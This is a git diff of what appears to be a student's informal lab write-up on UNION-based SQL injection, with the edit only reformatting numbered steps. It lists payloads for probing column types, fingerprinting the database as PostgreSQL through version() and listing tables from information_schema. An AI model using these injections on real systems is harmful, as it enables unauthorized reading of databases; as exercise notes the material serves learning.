@@ -16,8 +16,9 @@ here’s the screenshot showing the number of columns test worked:
   i tested UNION SELECT 'a', 'b' -- and it gave 200 OK = both colums accept type string
   
 - figure out the database version since we dont know the database software we are gonna depend on which one gives us 200 OK
-1- ' UNION SELECT @@version, NULL -- 500 internel server error -> not microsoft
-2- ' UNION SELECT version(), NULL -- 200 OK -> so now we know its PostgreSQL (PostgreSQL 12.22 (Ubuntu 12.22-0ubuntu0.20.04.4))
+
+' UNION SELECT @@version, NULL -- 500 internel server error -> not microsoft
+' UNION SELECT version(), NULL -- 200 OK -> so now we know its PostgreSQL (PostgreSQL 12.22 (Ubuntu 12.22-0ubuntu0.20.04.4))
   
 - output the table names in the database
 ' UNION SELECT table_name, NULL FROM information_schema.tables --
